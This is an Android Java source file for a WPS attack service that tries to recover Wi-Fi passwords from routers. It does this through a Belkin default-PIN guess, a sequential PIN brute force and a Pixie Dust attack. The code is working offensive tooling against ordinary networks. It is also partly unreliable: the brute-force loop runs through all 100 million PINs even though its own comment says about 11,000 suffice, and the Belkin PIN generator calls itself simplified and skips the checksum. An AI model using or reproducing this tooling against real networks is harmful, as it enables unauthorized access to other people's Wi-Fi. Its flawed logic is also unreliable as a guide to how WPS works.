package sangiorgi.wps.lib.services;

import android.content.Context;
import android.net.wifi.WifiManager;
import android.util.Log;
import java.util.Locale;
import java.util.concurrent.CompletableFuture;
import sangiorgi.wps.lib.ConnectionUpdateCallback;
import sangiorgi.wps.lib.handlers.ConnectionHandler;
import sangiorgi.wps.lib.models.NetworkToTest;

/**
 * WPS connection service with cleaner architecture. Uses Command pattern and CompletableFuture for
 * better async handling.
 */
public class ConnectionService {

  private static final String TAG = "ConnectionService";

  private final ConnectionUpdateCallback callback;
  private final NetworkToTest networkToTest;

  private final WpsExecutor executor;
  private final ConnectionStateManager stateManager;
  private final ConnectionHandler.Factory connectionHandlerFactory;

  private ConnectionHandler activeHandler;

  /** Factory interface for creating ConnectionService instances. */
  public interface Factory {
    ConnectionService create(NetworkToTest networkToTest, ConnectionUpdateCallback callback);
  }

  /**
   * Creates a ConnectionService.
   *
   * @param context Application context
   * @param executor WpsExecutor instance
   * @param connectionHandlerFactory Factory for creating ConnectionHandler
   * @param networkToTest Network to test
   * @param callback Callback for updates
   */
  public ConnectionService(
      Context context,
      WpsExecutor executor,
      ConnectionHandler.Factory connectionHandlerFactory,
      NetworkToTest networkToTest,
      ConnectionUpdateCallback callback) {
    WifiManager wifiManager =
        (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
    this.callback = callback;
    this.networkToTest = networkToTest;

    this.executor = executor;
    this.connectionHandlerFactory = connectionHandlerFactory;
    this.stateManager = new ConnectionStateManager(context, wifiManager, callback);
  }

  /** Start standard WPS connection */
  public CompletableFuture<Void> startConnection(boolean useOldMethod) {
    return CompletableFuture.runAsync(
        () -> {
          stopActiveHandler();
          stateManager.setCancelled(false);

          activeHandler =
              connectionHandlerFactory.create(networkToTest, callback, stateManager, useOldMethod);
          activeHandler.start();
        });
  }

  /** Start Belkin-specific connection */
  public CompletableFuture<Void> startBelkinConnection() {
    return CompletableFuture.runAsync(
        () -> {
          stopActiveHandler();
          stateManager.setCancelled(false);

          // Use specific Belkin PIN generation
          String belkinPin = generateBelkinPin(networkToTest.getBssid());

          executor
              .executeWpsConnection(networkToTest.getBssid(), belkinPin)
              .thenAccept(
                  result -> {
                    if (result.isSuccess()) {
                      String password = result.getPassword();
                      if (password != null) {
                        networkToTest.setPassword(password);
                      }
                      stateManager.handleSuccessfulConnection(password);
                    } else {
                      stateManager.handleFailedConnection("Belkin connection failed", -1);
                    }
                  })
              .exceptionally(
                  throwable -> {
                    Log.e(TAG, "Belkin connection error", throwable);
                    stateManager.handleFailedConnection(throwable.getMessage(), -1);
                    return null;
                  });
        });
  }

  /**
   * Start brute force connection with delay.
   *
   * <p>WPS PIN verification happens in two phases:
   *
   * <ul>
   *   <li>First 4 digits are verified (M4 message) - 10,000 possibilities
   *   <li>Last 3 digits are verified (M6 message) - 1,000 possibilities
   *   <li>8th digit is a checksum calculated from the first 7
   * </ul>
   *
   * Maximum attempts needed: ~11,000 (not 100 million)
   */
  public CompletableFuture<Void> startBruteforceConnection(int delayMs) {
    return CompletableFuture.runAsync(
        () -> {
          stopActiveHandler();
          stateManager.setCancelled(false);

          for (int currentPin = 0; currentPin <= 99999999; currentPin++) {
            if (stateManager.isCancelled()) {
              return;
            }

            String pin = String.format(Locale.ROOT, "%08d", currentPin);

            try {
              WpsResult result =
                  executor.executeWpsConnection(networkToTest.getBssid(), pin).join();

              if (result.isSuccess()) {
                String password = result.getPassword();
                if (password != null) {
                  networkToTest.setPassword(password);
                }
                stateManager.handleSuccessfulConnection(password);
                return;
              }

              // Delay between attempts
              if (delayMs > 0) {
                Thread.sleep(delayMs);
              }
            } catch (InterruptedException e) {
              Thread.currentThread().interrupt();
              return;
            } catch (Exception e) {
              Log.e(TAG, "Brute force attempt failed for PIN: " + pin, e);
            }
          }

          stateManager.handleFailedConnection("Brute force exhausted", -1);
        });
  }

  /** Execute Pixie Dust attack */
  public CompletableFuture<Void> startPixieDustAttack() {
    return executor
        .executePixieDust(networkToTest.getBssid())
        .thenAccept(
            result -> {
              if (result.isSuccess()) {
                // Check if we got a PIN
                String pin = result.getPin();
                if (pin != null) {
                  String password = result.getPassword();
                  networkToTest.setPins(new String[] {pin});
                  if (password != null) {
                    networkToTest.setPassword(password);
                  }
                  // Report success with PIN and password (password may be null)
                  callback.onPixieDustSuccess(pin, password);
                } else {
                  // No PIN found
                  callback.onPixieDustFailure("PIN not found. Router may not be vulnerable.");
                }
              } else {
                // Use the output which contains the PixieDustResult message (includes WPS locked
                // info)
                String errorMessage = result.getOutputAsString();
                if (errorMessage == null || errorMessage.trim().isEmpty()) {
                  errorMessage = "Pixie Dust attack failed";
                }
                callback.onPixieDustFailure(errorMessage.trim());
              }
            })
        .exceptionally(
            throwable -> {
              Log.e(TAG, "Pixie Dust error", throwable);
              callback.onPixieDustFailure(throwable.getMessage());
              return null;
            });
  }

  /** Cancel all active operations */
  public void cancel() {
    stopActiveHandler();
    stateManager.cancel();
    executor.cancel();
  }

  /** Cleanup resources. Does not kill processes — sessions handle their own process cleanup. */
  public void cleanup() {
    stopActiveHandler();
    stateManager.cancel();
  }

  private void stopActiveHandler() {
    if (activeHandler != null && activeHandler.isRunning()) {
      activeHandler.stop();
      activeHandler = null;
    }
  }

  private String generateBelkinPin(String bssid) {
    // Belkin PIN generation logic
    // This is a simplified version - actual implementation would be more complex
    String mac = bssid.replace(":", "");
    int seed = Integer.parseInt(mac.substring(6), 16);
    return String.format(Locale.ROOT, "%08d", seed % 100000000);
  }
}
